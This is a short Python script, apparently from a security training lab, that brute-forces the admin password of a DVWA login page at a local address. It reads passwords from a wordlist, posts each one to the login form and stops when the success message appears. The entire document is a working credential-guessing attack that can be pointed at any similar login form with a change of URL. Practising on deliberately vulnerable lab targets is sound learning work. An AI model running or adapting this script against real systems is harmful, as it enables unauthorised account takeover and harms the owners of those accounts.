#!/usr/bin/python3
import os
import requests
target_url = 'http://192.168.1.22/dvwa/login.php'
wordlist = 'passwords.txt' if os.path.exists('passwords.txt') else os.path.join(os.path.dirname(__file__), 'passwords.txt')
with open(wordlist) as passwordsFile:
    for password in passwordsFile:
        data_dict = {'username': 'admin', 'password': password.strip(), 'Login': 'submit'}
        response = requests.post(target_url, data=data_dict)
        if 'You have logged in' in response.content.decode('utf-8'):
            print('Valid Creds --> admin:' + password)
            passwordsFile.close()
            exit()
print('[-] Not Found in the Wordlist')
